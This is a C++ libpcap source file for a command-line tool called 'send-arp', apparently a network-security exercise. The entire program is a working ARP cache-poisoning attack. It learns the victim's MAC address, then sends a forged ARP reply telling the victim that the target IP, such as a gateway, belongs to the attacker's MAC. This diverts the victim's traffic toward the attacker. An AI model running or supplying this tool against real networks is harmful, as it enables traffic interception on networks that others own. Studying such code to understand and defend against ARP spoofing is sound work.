#include <iostream>
#include <stdio.h>
#include <cstdio>
#include <pcap.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <net/if.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include "mac.h"

#pragma pack(push, 1)
struct arp_packet {
  EthHdr eth_;
  ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
  printf("syntax : send-arp <interface> <sender ip> <target ip>\n");
  printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

// ref:
// https://www.includehelp.com/cpp-programs/get-mac-address-of-linux-based-network-device.aspx
void get_my_mac_address(char* dev, char* uc_Mac) {
  int fd;

  struct ifreq ifr;
  char* mac;

  fd = socket(AF_INET, SOCK_DGRAM, 0);

  ifr.ifr_addr.sa_family = AF_INET;
  strncpy((char*)ifr.ifr_name, (const char*)dev, IFNAMSIZ - 1);

  ioctl(fd, SIOCGIFHWADDR, &ifr);

  close(fd);

  mac = (char*)ifr.ifr_hwaddr.sa_data;

  sprintf((char*)uc_Mac, (const char*)"%02x:%02x:%02x:%02x:%02x:%02x",
          mac[0] & 0xff, mac[1] & 0xff, mac[2] & 0xff, mac[3] & 0xff,
          mac[4] & 0xff, mac[5] & 0xff);
}

// ref:
// https://stackoverflow.com/questions/2283494/get-ip-address-of-an-interface-on-linux
void get_my_ipv4_address(const char* dev, char* uc_IP) {
  int fd;
  struct ifreq ifr;
  uint32_t ip_address;

  fd = socket(AF_INET, SOCK_DGRAM, 0);

  ifr.ifr_addr.sa_family = AF_INET;
  strncpy((char*)ifr.ifr_name, dev, IFNAMSIZ - 1);

  ioctl(fd, SIOCGIFADDR, &ifr);

  close(fd);

  ip_address = ntohl((((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr).s_addr);

  sprintf(uc_IP, "%d.%d.%d.%d", (ip_address & 0xFF000000) >> 24,
          (ip_address & 0x00FF0000) >> 16, (ip_address & 0x0000FF00) >> 8,
          (ip_address & 0x000000FF));
}

int aio_send_packet(pcap_t* handle, Mac ethernetDestinationMac,
                    Mac ethernetSourceMac, u_short operation, Mac arpSourceMac,
                    u_long arpSourceIp, Mac arpTargetMac, u_long arpTargetIp) {
  arp_packet packet;

  packet.eth_.dmac_ = ethernetDestinationMac;
  packet.eth_.smac_ = ethernetSourceMac;
  packet.eth_.type_ = htons(EthHdr::Arp);

  packet.arp_.hrd_ = htons(ArpHdr::ETHER);
  packet.arp_.pro_ = htons(EthHdr::Ip4);
  packet.arp_.hln_ = Mac::SIZE;
  packet.arp_.pln_ = Ip::SIZE;
  packet.arp_.op_ = operation;
  packet.arp_.smac_ = arpSourceMac;
  packet.arp_.sip_ = arpSourceIp;
  packet.arp_.tmac_ = arpTargetMac;
  packet.arp_.tip_ = arpTargetIp;

  return pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet),
                         sizeof(arp_packet));
}

int main(int argc, char* argv[]) {
  if (argc != 4) {
    usage();
    return -1;
  }

  char* dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == nullptr) {
    printf("ERROR: Couldn't open device %s(%s)\n", dev, errbuf);
    return -1;
  }
  char my_mac[18], my_ip[16];
  get_my_mac_address(dev, my_mac);
  get_my_ipv4_address(dev, my_ip);

  char sender_mac[18];
  char* sender_ip = argv[2];

  char* target_ip = argv[3];

  int res;

  res = aio_send_packet(handle, Mac("ff:ff:ff:ff:ff:ff"), Mac(my_mac),
                        htons(ArpHdr::Request), Mac(my_mac), htonl(Ip(my_ip)),
                        Mac("00:00:00:00:00:00"), htonl(Ip(sender_ip)));

  if (res != 0) {
    printf("ERROR: pcap_sendpacket return %d error=%s\n", res,
           pcap_geterr(handle));
    return -1;
  }

  struct pcap_pkthdr* header;
  const uint8_t* packet;
  while (true) {
    sleep(0);
    res = pcap_next_ex(handle, &header, &packet);

    if (res == 0) continue;
    if (res == -1 || res == -2) {
      printf("ERROR: pcap_next_ex return %d error=%s\n", res,
             pcap_geterr(handle));
      return -1;
    }

    EthHdr* respondEthernet = (EthHdr*)packet;

    if (respondEthernet->type() != EthHdr::Arp) {
      continue;
    }

    ArpHdr* arpRespond = (ArpHdr*)(packet + sizeof(EthHdr));

    if (arpRespond->hrd() != ArpHdr::ETHER ||
        arpRespond->pro() != EthHdr::Ip4 || arpRespond->op() != ArpHdr::Reply) {
      continue;
    }

    if (arpRespond->tmac() == Mac(my_mac) && arpRespond->tip() == Ip(my_ip) &&
        arpRespond->sip() == Ip(sender_ip)) {
      uint8_t* sender_mac_num = arpRespond->smac();
      snprintf(sender_mac, sizeof(sender_mac), "%02x:%02x:%02x:%02x:%02x:%02x",
               sender_mac_num[0], sender_mac_num[1], sender_mac_num[2],
               sender_mac_num[3], sender_mac_num[4], sender_mac_num[5]);
      break;
    }
  }

  res = aio_send_packet(handle, Mac(sender_mac), Mac(my_mac),
                        htons(ArpHdr::Reply), Mac(my_mac), htonl(Ip(target_ip)),
                        Mac(sender_mac), htonl(Ip(sender_ip)));

  if (res != 0) {
    printf("ERROR: pcap_sendpacket return %d error=%s\n", res,
           pcap_geterr(handle));
    return -1;
  }

  pcap_close(handle);

  printf("Done!\n");
}
